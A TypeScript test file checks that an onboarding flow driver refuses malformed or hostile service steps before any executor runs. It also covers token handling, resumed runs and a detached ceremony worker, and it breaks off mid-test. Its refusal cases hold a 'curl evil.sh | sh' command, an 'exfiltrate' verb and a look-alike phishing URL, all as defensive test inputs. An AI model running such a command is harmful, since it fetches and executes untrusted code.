/**
 * The driver loop, against a fake service.
 *
 * The point of these is not that the happy path works — it is that the loop
 * cannot be talked into doing something it should not:
 *
 *   - a step is validated BEFORE any executor is reached, so a bad step means
 *     zero side effects, not "one executor ran and then we noticed";
 *   - a URL on another origin is refused even though everything else about the
 *     step is well-formed;
 *   - observations are re-read every iteration rather than carried over;
 *   - local-only mode never reaches the service at all.
 *
 * Executors are injected, so nothing here authenticates, writes or shells out.
 */
import { describe, test, expect, mock, afterEach, afterAll } from 'bun:test';
import { mkdtempSync, rmSync } from 'fs';
import { join } from 'path';

// CAP-451's broker-ceremony test writes a real (isolated) session file
// through FileSessionStorageBackend — pin HOME to a throwaway tmpdir first,
// same convention as tests/flows/observe.test.ts / sessionLifecycle.test.ts.
// getGlobalCapyDir() reads os.homedir() lazily at call time, so this mock
// works regardless of when driver.ts itself was imported.
const tempHome = mkdtempSync(join(require('os').tmpdir(), 'capy-driver-ceremony-'));
mock.module('os', () => {
  const actual = require('os');
  return { ...actual, homedir: () => tempHome };
});
afterAll(() => {
  mock.restore();
  rmSync(tempHome, { recursive: true, force: true });
});

import { runOnboardFlow } from '../../src/flows/onboard/driver';
import { FLOW_CONTRACT_VERSION, FlowContractError, FLOW_ERROR_CODES } from '../../src/flows/validate';
import { ExecutorMap, StepResult } from '../../src/flows/onboard/executors';
import { CreateFlowRequest, FlowHttpError, FlowTransport, NextRequest } from '../../src/flows/client';
import { OnboardObservations } from '../../src/flows/onboard/observe';
import { mintConnectionKeypair } from '../../src/service/brokerEnvelope';
import { keepOrigin } from '../../src/ui/screens/keepScreens';
import { writeCeremonyMarker } from '../../src/flows/onboard/ceremonyWorker';

const FLOW_ID = 'flow-1';

function envelope(over: Record<string, unknown>): Record<string, unknown> {
  return {
    contract_version: FLOW_CONTRACT_VERSION,
    flow_id: FLOW_ID,
    flow_type: 'onboard',
    step_id: `s-${Math.random().toString(36).slice(2, 8)}`,
    resumed: false,
    params: {},
    ...over,
  };
}

const OBS: OnboardObservations = {
  targetDirValid: true,
  hasCapyDir: false,
  hasKeepLock: false,
  envMetaRecoverable: false,
  envStillPlaintext: true,
  commandsWrapped: false,
  branchConflict: false,
  sessionLive: false,
  orgKeyOnDevice: true,
};

/** A fake service that hands back a scripted sequence and records what it was told. */
function fakeTransport(steps: Array<Record<string, unknown>>, createStep: unknown = null) {
  const reports: NextRequest[] = [];
  const created: CreateFlowRequest[] = [];
  let i = 0;
  const transport: FlowTransport = {
    async create(body) {
      created.push(body);
      return {
        flow_id: FLOW_ID,
        flow_type: 'onboard',
        contract_version: FLOW_CONTRACT_VERSION,
        binding: 'anonymous',
        flow_secret: 'sekrit',
        step: createStep,
      };
    },
    async next(_id, body) {
      reports.push(body);
      const step = steps[Math.min(i, steps.length - 1)];
      i++;
      return { step };
    },
    async confirm() {
      return { recorded: true };
    },
    async cancel() {
      /* nothing */
    },
  };
  return { transport, reports, created, calls: () => i };
}

/** Executors that record their calls and flip nothing. */
function recordingExecutors(outcome: StepResult = { outcome: 'ok' }): { map: ExecutorMap; calls: string[] } {
  const calls: string[] = [];
  const make = (verb: string) => async () => {
    calls.push(verb);
    return outcome;
  };
  return {
    calls,
    map: {
      authenticate: make('authenticate'),
      write_capy_dir: make('write_capy_dir'),
      write_keep_lock: make('write_keep_lock'),
      wrap_run_commands: make('wrap_run_commands'),
      encrypt_env: make('encrypt_env'),
      unlock_org_key: make('unlock_org_key'),
    },
  };
}

const observeStub = (obs: Partial<OnboardObservations> = {}) => () => ({ ...OBS, ...obs });

describe('driver: the happy loop', () => {
  test('executes each local action it is given and stops on done', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: { org_hint: null } }),
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' } }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
    });

    expect(calls).toEqual(['authenticate', 'write_capy_dir']);
    expect(result.step.kind).toBe('done');
    expect(result.executed.map((e) => e.verb)).toEqual(['authenticate', 'write_capy_dir']);
    // Fresh observations every pass — the reconciler is level-triggered.
    expect(reports.length).toBe(3);
    expect(reports[0].observations).toEqual(OBS);
  });

  test('reports the previous step outcome, with the ids it resolved', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_keep_lock', params: { source: 'select_or_create', consent_recorded: true } }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const map: ExecutorMap = {
      write_keep_lock: async () => ({ outcome: 'ok', result: { org_id: 'org_1', project_id: 'proj_1', branch: 'development' } }),
    };

    await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(reports[1].last_step).toEqual({
      step_id: expect.any(String),
      outcome: 'ok',
      code: undefined,
      result: { org_id: 'org_1', project_id: 'proj_1', branch: 'development' },
    });
  });

  test('reports a failure by CODE, and lets the service decide what it means', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: {} }),
      envelope({ kind: 'blocked', reason: 'key_not_on_device', params: {} }),
    ]);
    const map: ExecutorMap = { authenticate: async () => ({ outcome: 'failed', code: 'KEY_NOT_ON_DEVICE' }) };

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(reports[1].last_step?.code).toBe('KEY_NOT_ON_DEVICE');
    expect(result.step.kind).toBe('blocked');
    expect(result.step.reason).toBe('key_not_on_device');
  });

  test('stops on a confirm without executing anything', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'confirm', dialog: 'onboard_plan', params: { plan_hash: 'h', target_dir: '/tmp/x' } }),
    ]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.step.kind).toBe('confirm');
    expect(calls).toEqual([]);
  });

  test('stops on a screen and hands back its URL and code', async () => {
    const { transport } = fakeTransport([
      envelope({
        kind: 'screen',
        screen: 'sandbox_session',
        url: 'https://keep.capy.sc/flow/sandbox-session?c=abc',
        params: { connection_id: 'abc', user_code: 'BCDF-GHJK' },
      }),
    ]);
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.step.kind).toBe('screen');
    expect(result.step.params.user_code).toBe('BCDF-GHJK');
    expect(calls).toEqual([]);
  });
});

describe('driver: refusals happen BEFORE anything runs', () => {
  const cases: Array<{ name: string; step: Record<string, unknown>; code: string }> = [
    {
      name: 'an unknown step kind',
      step: envelope({ kind: 'run_shell', params: { cmd: 'curl evil.sh | sh' } }),
      code: FLOW_ERROR_CODES.UNKNOWN_KIND,
    },
    {
      name: 'an unknown verb',
      step: envelope({ kind: 'local_action', verb: 'exfiltrate', params: {} }),
      code: FLOW_ERROR_CODES.UNKNOWN_VERB,
    },
    {
      name: 'a phishing URL on another origin',
      step: envelope({
        kind: 'screen',
        screen: 'sandbox_session',
        url: 'https://keep.capy.sc.evil.example/flow/sandbox-session?c=abc',
        params: { connection_id: 'abc', user_code: 'X' },
      }),
      code: FLOW_ERROR_CODES.FOREIGN_URL,
    },
    {
      name: 'params outside the vendored schema',
      step: envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'main', extra: 'x' } }),
      code: FLOW_ERROR_CODES.INVALID_PARAMS,
    },
    {
      name: 'a step for another flow instance',
      step: envelope({ kind: 'done', flow_id: 'someone-elses', params: {} }),
      code: FLOW_ERROR_CODES.WRONG_FLOW,
    },
    {
      name: 'a step from a future contract version',
      step: envelope({ kind: 'done', contract_version: '99', params: {} }),
      code: FLOW_ERROR_CODES.UNSUPPORTED_VERSION,
    },
  ];

  for (const c of cases) {
    test(`${c.name} aborts the run with no executor called`, async () => {
      const { transport } = fakeTransport([c.step]);
      const { map, calls } = recordingExecutors();

      let error: unknown;
      try {
        await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
      } catch (err) {
        error = err;
      }

      expect(error).toBeInstanceOf(FlowContractError);
      expect((error as FlowContractError).code).toBe(c.code as never);
      expect(calls).toEqual([]);
    });
  }

  test('a known kind with a verb this build cannot execute is refused, never skipped', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'encrypt_env', params: { branch: 'main', variable_count: 1, consent_recorded: true } }),
    ]);
    // A build whose executor map is missing that verb.
    const map: ExecutorMap = { authenticate: async () => ({ outcome: 'ok' }) };

    await expect(
      runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() }),
    ).rejects.toBeInstanceOf(FlowContractError);
  });
});

describe('driver: creation', () => {
  test('sends the plan and compat findings, and returns a creation-time step as the answer', async () => {
    const { transport, created } = fakeTransport(
      [envelope({ kind: 'done', params: {} })],
      envelope({ kind: 'blocked', reason: 'incompatible_project', params: {} }),
    );
    const { map, calls } = recordingExecutors();

    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      plan: { plan_hash: 'h' },
      compat: { usesEnvVars: false },
    });

    expect(created[0].compat).toEqual({ usesEnvVars: false });
    expect(created[0].contract_version).toBe(FLOW_CONTRACT_VERSION);
    expect(result.step.reason).toBe('incompatible_project');
    expect(calls).toEqual([]);
  });

  test('hands the one-time secret back to the caller and never writes it anywhere', async () => {
    const { transport } = fakeTransport([envelope({ kind: 'done', params: {} })]);
    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: recordingExecutors().map,
      observe: observeStub(),
    });
    expect(result.flowSecret).toBe('sekrit');
  });

  test('refuses to spin forever when the service keeps handing back work', async () => {
    const { transport } = fakeTransport([envelope({ kind: 'local_action', verb: 'authenticate', params: {} })]);
    await expect(
      runOnboardFlow({
        targetDir: '/tmp/x',
        transport,
        executors: recordingExecutors().map,
        observe: observeStub(),
        maxSteps: 3,
      }),
    ).rejects.toThrow();
  });
});

describe('CAP-484 — `resetStuckFlow` cancels a stuck lock holder and retries create once', () => {
  const STUCK_FLOW_ID = 'flow-stuck';

  /**
   * Scripts a repo lock held by ANOTHER instance: the first `create()` comes
   * back `blocked: concurrent_flow` naming `STUCK_FLOW_ID`; every call
   * AFTER a `cancel()` on that id returns a fresh instance instead. Records
   * both, so tests can assert exactly one cancel and exactly one retry.
   */
  function fakeStuckTransport(afterCancelReason: string | null = null) {
    const cancelled: Array<{ flowId: string; creds: unknown }> = [];
    const createCalls: unknown[] = [];
    let released = false;
    const transport: FlowTransport = {
      async create(body) {
        createCalls.push(body);
        if (!released) {
          return {
            flow_id: STUCK_FLOW_ID,
            flow_type: 'onboard',
            contract_version: FLOW_CONTRACT_VERSION,
            binding: 'anonymous',
            step: envelope({
              flow_id: STUCK_FLOW_ID,
              kind: 'blocked',
              reason: 'concurrent_flow',
              step_id: 'blocked:concurrent_flow',
              params: {},
            }),
          };
        }
        return {
          flow_id: 'flow-fresh',
          flow_type: 'onboard',
          contract_version: FLOW_CONTRACT_VERSION,
          binding: 'anonymous',
          flow_secret: 'fresh-sekrit',
          step: afterCancelReason
            ? envelope({
                flow_id: 'flow-fresh',
                kind: 'blocked',
                reason: afterCancelReason,
                step_id: `blocked:${afterCancelReason}`,
                params: {},
              })
            : null,
        };
      },
      async next() {
        return { step: envelope({ flow_id: 'flow-fresh', kind: 'done', params: {} }) };
      },
      async confirm() {
        return { recorded: true };
      },
      async cancel(flowId, creds) {
        cancelled.push({ flowId, creds });
        released = true;
      },
    };
    return { transport, cancelled, createCalls };
  }

  test('cancels the stuck holder and retries create exactly once', async () => {
    const { transport, cancelled, createCalls } = fakeStuckTransport();
    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: recordingExecutors().map,
      observe: observeStub(),
      token: 'owner-jwt',
      resetStuckFlow: true,
    });

    expect(cancelled).toEqual([{ flowId: STUCK_FLOW_ID, creds: { token: 'owner-jwt' } }]);
    expect(createCalls.length).toBe(2);
    expect(result.flowId).toBe('flow-fresh');
    expect(result.flowSecret).toBe('fresh-sekrit');
    expect(result.step.kind).toBe('done');
  });

  test('does nothing when resetStuckFlow is not set — reports the block as usual', async () => {
    const { transport, cancelled, createCalls } = fakeStuckTransport();
    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: recordingExecutors().map,
      observe: observeStub(),
      token: 'owner-jwt',
    });

    expect(cancelled).toEqual([]);
    expect(createCalls.length).toBe(1);
    expect(result.step.kind).toBe('blocked');
    expect(result.step.reason).toBe('concurrent_flow');
  });

  test('does nothing for an anonymous caller — no identity to authorize a cancel with', async () => {
    const { transport, cancelled, createCalls } = fakeStuckTransport();
    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: recordingExecutors().map,
      observe: observeStub(),
      resetStuckFlow: true,
      // no token
    });

    expect(cancelled).toEqual([]);
    expect(createCalls.length).toBe(1);
    expect(result.step.kind).toBe('blocked');
    expect(result.step.reason).toBe('concurrent_flow');
  });

  test('never loops: a SECOND concurrent_flow after the cancel is reported, not retried again', async () => {
    const { transport, cancelled, createCalls } = fakeStuckTransport('concurrent_flow');
    const result = await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: recordingExecutors().map,
      observe: observeStub(),
      token: 'owner-jwt',
      resetStuckFlow: true,
    });

    expect(cancelled.length).toBe(1);
    expect(createCalls.length).toBe(2);
    expect(result.step.kind).toBe('blocked');
    expect(result.step.reason).toBe('concurrent_flow');
  });
});

describe('G1 — a token minted mid-flow travels on the next request', () => {
  test('the request AFTER a successful authenticate carries it; the one before does not', async () => {
    const seen: Array<string | undefined> = [];
    let signedIn = false;
    const transport: FlowTransport = {
      async create() {
        return {
          flow_id: FLOW_ID,
          flow_type: 'onboard',
          contract_version: FLOW_CONTRACT_VERSION,
          binding: 'anonymous',
          flow_secret: 'sekrit',
          step: null,
        };
      },
      async next(_id, _body, creds) {
        seen.push(creds.token);
        return {
          step: seen.length === 1
            ? envelope({ kind: 'local_action', verb: 'authenticate', params: {} })
            : envelope({ kind: 'done', params: {} }),
        };
      },
      async confirm() {
        return {};
      },
      async cancel() {},
    };

    const map: ExecutorMap = {
      authenticate: async () => {
        signedIn = true;
        return { outcome: 'ok' };
      },
    };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      getToken: async () => (signedIn ? 'jwt-after-auth' : undefined),
    });

    expect(seen).toEqual([undefined, 'jwt-after-auth']);
  });

  test('a FAILED step does not promote a token', async () => {
    const seen: Array<string | undefined> = [];
    const transport: FlowTransport = {
      async create() {
        return { flow_id: FLOW_ID, flow_type: 'onboard', contract_version: FLOW_CONTRACT_VERSION, binding: 'anonymous', step: null };
      },
      async next(_id, _body, creds) {
        seen.push(creds.token);
        return {
          step: seen.length === 1
            ? envelope({ kind: 'local_action', verb: 'authenticate', params: {} })
            : envelope({ kind: 'blocked', reason: 'auth_declined', params: {} }),
        };
      },
      async confirm() {
        return {};
      },
      async cancel() {},
    };
    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: { authenticate: async () => ({ outcome: 'failed', code: 'AUTH_FAILED' }) },
      observe: observeStub(),
      getToken: async () => 'should-not-be-used',
    });
    expect(seen).toEqual([undefined, undefined]);
  });

  // HANDOFF bug B, CLI side: `authenticate` runs before the caller has an org
  // (org-less mint), but `write_keep_lock` selects/creates one — after which
  // `getToken()` (scoped via sync-state user_id) resolves to the FRESH,
  // org-scoped session, not the org-less one `authenticate` minted. The old
  // `mintedToken ?? (await getToken())` kept shadowing it with the stale one
  // for the rest of the run, which is exactly what sent the org-less bearer
  // into the pin check that 403'd.
  test('a token getToken() resolves AFTER write_keep_lock wins over the one authenticate minted', async () => {
    const seen: Array<string | undefined> = [];
    let orgCreated = false;
    const transport: FlowTransport = {
      async create() {
        return { flow_id: FLOW_ID, flow_type: 'onboard', contract_version: FLOW_CONTRACT_VERSION, binding: 'anonymous', flow_secret: 'sekrit', step: null };
      },
      async next(_id, _body, creds) {
        seen.push(creds.token);
        if (seen.length === 1) return { step: envelope({ kind: 'local_action', verb: 'authenticate', params: {} }) };
        if (seen.length === 2) {
          return {
            step: envelope({
              kind: 'local_action',
              verb: 'write_keep_lock',
              params: { source: 'select_or_create', consent_recorded: true },
            }),
          };
        }
        return { step: envelope({ kind: 'done', params: {} }) };
      },
      async confirm() { return {}; },
      async cancel() {},
    };
    const map: ExecutorMap = {
      authenticate: async (_step, ctx) => {
        // Mints an ORG-LESS session — exactly what a brand-new identity gets.
        ctx.onSession?.({ token: 'orgless-token', userId: 'user_1' });
        return { outcome: 'ok' };
      },
      write_keep_lock: async () => {
        orgCreated = true;
        return { outcome: 'ok', result: { org_id: 'org_1', project_id: 'proj_1' } };
      },
    };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      // Scoped exactly the way the real getToken (AuthService, keyed by
      // sync-state user_id) behaves: nothing until an org exists, then the
      // real org-scoped session.
      getToken: async () => (orgCreated ? 'org-scoped-token' : undefined),
    });

    // step 1 (authenticate) carries nothing; step 2 (write_keep_lock) carries
    // the org-less token authenticate minted (getToken() has nothing yet);
    // step 3 (done) carries the FRESH org-scoped token, not the stale org-less one.
    expect(seen).toEqual([undefined, 'orgless-token', 'org-scoped-token']);
  });
});

describe('BUG A — ctx.consented is set from the step, per step, not fixed at false', () => {
  test('the executor sees consented=true exactly when the step says consent_recorded=true', async () => {
    const seenConsented: boolean[] = [];
    const { transport } = fakeTransport([
      envelope({
        kind: 'local_action',
        verb: 'write_keep_lock',
        params: { source: 'env_header', consent_recorded: false },
      }),
      envelope({
        kind: 'local_action',
        verb: 'wrap_run_commands',
        params: { plan_hash: 'h', kinds: ['run-wrap'], consent_recorded: true },
      }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const map: ExecutorMap = {
      write_keep_lock: async (_step, ctx) => {
        seenConsented.push(ctx.consented);
        return { outcome: 'ok' };
      },
      wrap_run_commands: async (_step, ctx) => {
        seenConsented.push(ctx.consented);
        return { outcome: 'ok' };
      },
    };

    await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(seenConsented).toEqual([false, true]);
  });
});

describe('BUG C — resumed is read from the FIRST envelope only, never OR-ed across steps', () => {
  test('a genuinely fresh run reports resumed:false even though it has, by step 2, already issued a step', async () => {
    // Every envelope in this scripted run says resumed:false — the server-side
    // fix means the SAME instance echoes the same decided value on every step,
    // but the point of this test is the DRIVER: even if it were handed a stale
    // true on a later step by a service that had not yet been fixed, the old
    // bug was ORing `step.resumed` across steps. Assert the driver reports
    // exactly the FIRST envelope's value.
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: {}, resumed: false }),
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' }, resumed: false }),
      envelope({ kind: 'done', params: {}, resumed: false }),
    ]);
    const { map } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.resumed).toBe(false);
  });

  test('reports the value from the FIRST envelope even if a later one disagrees', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'authenticate', params: {}, resumed: false }),
      // A later step reporting true must NOT flip the run's answer — the
      // service is supposed to echo one decided value for the whole instance,
      // and the driver's job is to trust the first one, not accumulate them.
      envelope({ kind: 'done', params: {}, resumed: true }),
    ]);
    const { map } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.resumed).toBe(false);
  });

  test('a run that starts already resumed reports true from its first envelope', async () => {
    const { transport } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' }, resumed: true }),
      envelope({ kind: 'done', params: {}, resumed: true }),
    ]);
    const { map } = recordingExecutors();

    const result = await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });
    expect(result.resumed).toBe(true);
  });
});

describe('G4 — ids resolved by a step that then failed are still reported', () => {
  test('the failed report carries the result, so the service can pin it', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_keep_lock', params: { source: 'select_or_create', consent_recorded: true } }),
      envelope({ kind: 'blocked', reason: 'service_error', params: {} }),
    ]);
    const map: ExecutorMap = {
      write_keep_lock: async () => ({
        outcome: 'failed',
        code: 'SERVICE_ERROR',
        result: { org_id: 'org_1', project_id: 'proj_1' },
      }),
    };

    await runOnboardFlow({ targetDir: '/tmp/x', transport, executors: map, observe: observeStub() });

    expect(reports[1].last_step).toEqual({
      step_id: expect.any(String),
      outcome: 'failed',
      code: 'SERVICE_ERROR',
      result: { org_id: 'org_1', project_id: 'proj_1' },
    });
  });
});

describe('G5 — a plan that moved under the human is resent', () => {
  test('sends the rebuilt plan only after a PLAN_CHANGED outcome', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'wrap_run_commands', params: { plan_hash: 'h1', kinds: ['run-wrap'], consent_recorded: true } }),
      envelope({ kind: 'blocked', reason: 'plan_changed', params: {} }),
    ]);
    const map: ExecutorMap = { wrap_run_commands: async () => ({ outcome: 'failed', code: 'PLAN_CHANGED' }) };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      buildPlan: () => ({ plan_hash: 'h2', target_dir: '/tmp/x' }),
    });

    // Not on the first report: an unchanged plan is never resent.
    expect(reports[0].plan).toBeUndefined();
    expect(reports[1].plan).toEqual({ plan_hash: 'h2', target_dir: '/tmp/x' });
  });
});

describe('G6 — a RESUMED run reports its own computed plan once, since a remote-minted flow carries none', () => {
  // A flow minted by the hosted MCP (`minted_for: 'remote'`) has no plan on
  // its row at all: the service only ever gets one from a client-reported
  // `body.plan`, either at create or via this same `next` field, and a
  // remote mint's create body has no local directory to compute one from.
  // `--flow-id`/`--flow-secret` skips `create` entirely (the `!flowId`
  // branch above never runs), so without this the confirm/onboard_plan
  // dialog's params (target_dir, variable_count, plan_hash, will_encrypt)
  // stayed empty forever — this is the dev-rig bug this fixes.
  test('a RESUME (flowId + flowSecret, no create call) sends the computed plan on its first next report', async () => {
    const { transport, reports, created } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' } }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const { map } = recordingExecutors();
    const plan = { plan_hash: 'h-resume', target_dir: '/tmp/x', variable_count: 1 };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      flowId: FLOW_ID,
      flowSecret: 'resumed-secret',
      plan,
    });

    // No create call at all — this is a resume, not a self-mint.
    expect(created).toEqual([]);
    expect(reports.length).toBe(2);
    expect(reports[0].plan).toEqual(plan);
  });

  test('falls back to buildPlan() on resume when no pre-computed plan was wired', async () => {
    const { transport, reports } = fakeTransport([envelope({ kind: 'done', params: {} })]);
    const { map } = recordingExecutors();

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      flowId: FLOW_ID,
      flowSecret: 'resumed-secret',
      buildPlan: () => ({ plan_hash: 'h-built', target_dir: '/tmp/x' }),
    });

    expect(reports[0].plan).toEqual({ plan_hash: 'h-built', target_dir: '/tmp/x' });
  });

  test('the self-mint path is unchanged: the plan travels in the create body, byte-identical, and never on next', async () => {
    const { transport, reports, created } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' } }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const { map } = recordingExecutors();
    const plan = { plan_hash: 'h-create', target_dir: '/tmp/x', variable_count: 2 };

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      plan,
      compat: { usesEnvVars: true },
    });

    expect(created.length).toBe(1);
    // The exact same reference the caller passed — never rebuilt or cloned.
    expect(created[0].plan).toBe(plan);
    // A self-mint is not a resume: the first `next` report carries no plan.
    expect(reports[0].plan).toBeUndefined();
  });

  test('no double-send: only the FIRST next report of a resumed run carries the plan', async () => {
    const { transport, reports } = fakeTransport([
      envelope({ kind: 'local_action', verb: 'write_capy_dir', params: { branch: 'development' } }),
      envelope({
        kind: 'local_action',
        verb: 'wrap_run_commands',
        params: { plan_hash: 'h-resume', kinds: ['run-wrap'], consent_recorded: true },
      }),
      envelope({ kind: 'done', params: {} }),
    ]);
    const { map } = recordingExecutors();

    await runOnboardFlow({
      targetDir: '/tmp/x',
      transport,
      executors: map,
      observe: observeStub(),
      flowId: FLOW_ID,
      flowSecret: 'resumed-secret',
      plan: { plan_hash: 'h-resume', target_dir: '/tmp/x' },
    });

    expect(reports.length).toBe(3);
    expect(reports[0].plan).toEqual({ plan_hash: 'h-resume', target_dir: '/tmp/x' });
    // Later reports on the SAME resumed run send nothing more — one report
    // is enough, and the service treats a resend of the same plan_hash as a
    // no-op in any case (`withReplacedPlan`, service/src/routes/flows.ts).
    expect(reports[1].plan).toBeUndefined();
    expect(reports[2].plan).toBeUndefined();
  });
});

describe('CAP-451 follow-up — the DETACHED-worker broker ceremony under --broker-ceremony', () => {
  // BEHAVIOR CHANGED BY DESIGN from the old in-process ceremony: the driver
  // used to run `runSandboxCeremony` inline and block on its poll (up to 15
  // minutes) before returning anything — so `capy onboard --broker-ceremony
  // --json` printed nothing until the ceremony settled, and a caller
  // awaiting this process (the MCP's `capy_onboard` tool) hung with no URL
  // ever shown to the human. The driver now calls `prepareCeremonyScreen`,
  // which spawns a detached worker and returns the `screen` step
  // IMMEDIATELY — this test asserts the new non-blocking contract (screen
  // returned on the first `/next`, a worker spawned exactly once, no poll
  // performed by the driver itself) in place of the old "ran through to
  // done inline" assertion.
  test('a screen:sandbox_session step is returned immediately, with a detached worker spawned exactly once, when brokerCeremonyKeypair is set', async () => {
    const keypair = mintConnectionKeypair();
    const ceremonyDir = mkdtempSync(join(require('os').tmpdir(), 'capy-driver-ceremony-target-'));

    const sandboxStep = envelope({
      kind: 'screen',
      screen: 'sandbox_session',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-1`,
      params: { connection_id: 'conn-1', user_code: 'BCDF-GHJK' },
    });
    const { transport, calls: callCount } = fakeTransport([sandboxStep]);
    const { map, calls } = recordingExecutors();

    const spawnCalls: Array<{ command: string; args: string[] }> = [];
    const fakeSpawnImpl = ((command: string, args: string[]) => {
      spawnCalls.push({ command, args });
      return {
        stdin: { write: () => true, end: () => undefined },
        unref: () => undefined,
      } as unknown as ReturnType<typeof import('child_process').spawn>;
    }) as typeof import('child_process').spawn;

    let result: Awaited<ReturnType<typeof runOnboardFlow>>;
    try {
      result = await runOnboardFlow({
        targetDir: ceremonyDir,
        transport,
        executors: map,
        observe: observeStub(),
        authMode: 'broker_ceremony',
        clientPubkey: keypair.publicKeyB64,
        brokerCeremonyKeypair: keypair,
        serviceUrl: 'https://api.test.invalid',
        flowSecret: 'flow-secret-1',
        ceremonySpawnImpl: fakeSpawnImpl,
        ceremonyResolveCommand: () => ({ command: 'node', args: ['cli-entry.js'] }),
      });
    } finally {
      rmSync(ceremonyDir, { recursive: true, force: true });
    }

    // Stops on the screen — the caller sees it on the very first pass, no
    // blocking poll in between.
    expect(result.step.kind).toBe('screen');
    expect(result.step.screen).toBe('sandbox_session');
    expect(result.step.params.connection_id).toBe('conn-1');
    // Same anti-phishing code the flow handed us — carried through untouched.
    expect(result.step.params.user_code).toBe('BCDF-GHJK');
    // The URL now carries the ceremony's own request fragment.
    expect(result.step.url).toContain('#r=');
    // No local_action executor reached — this step never falls through to
    // the ordinary executor map.
    expect(calls).toEqual([]);
    // Exactly one `/next` call: the driver returns on the FIRST screen, it
    // never polls or re-asks the service for this step.
    expect(callCount()).toBe(1);
    // Exactly one detached worker spawned for this connection.
    expect(spawnCalls.length).toBe(1);
    expect(spawnCalls[0].args).toContain('cli-entry.js');
  });

  // CAP-542: proves the FULL real path — a genuine `validateStep` pass
  // against the vendored contract (so this also proves the contract schema
  // itself accepts the param) through `prepareCeremonyScreen`'s real
  // `buildCeremonyUrl` call — with no driver.ts code change: the step object
  // (params included) already flows through `driver.ts` unmodified into
  // `prepareCeremonyScreen`'s options.
  test('CAP-542: a mint_org_id step param survives contract validation and lands in the returned URL fragment', async () => {
    const keypair = mintConnectionKeypair();
    const ceremonyDir = mkdtempSync(join(require('os').tmpdir(), 'capy-driver-ceremony-target-'));

    const sandboxStep = envelope({
      kind: 'screen',
      screen: 'sandbox_session',
      url: `${keepOrigin()}/flow/sandbox-session?c=conn-mint-org-1`,
      params: { connection_id: 'conn-mint-org-1', user_code: 'BCDF-GHJK', mint_org_id: 'org_xyz' },
    });
    const { transport } = fakeTransport([sandboxStep]);
    const { map } = recordingExecutors();

    const fakeSpawnImpl = ((command: string, args: string[]) => {
      return {
        stdin: { write: () => true, end: () => undefined },
        unref: () => undefined,
      } as unknown as ReturnType<typeof import('child_process').spawn>;
    }) as typeof import('child_process').spawn;

    const result = await (async () => {
      try {
        return await runOnboardFlow({
          targetDir: ceremonyDir,
          transport,
          executors: map,
          observe: observeStub(),
          authMode: 'broker_ceremony',
          clientPubkey: keypair.publicKeyB64,
          brokerCeremonyKeypair: keypair,
          serviceUrl: 'https://api.test.invalid',
          flowSecret: 'flow-secret-mint-org-1',
          ceremonySpawnImpl: fakeSpawnImpl,
          ceremonyResolveCommand: () => ({ command: 'node', args: ['cli-entry.js'] }),
        });
      } finally {
        rmSync(ceremonyDir, { recursive: true, force: true });
      }
    })();

    expect(result.step.kind).toBe('screen');
    const b64 = result.step.url.split('#r=')[1];
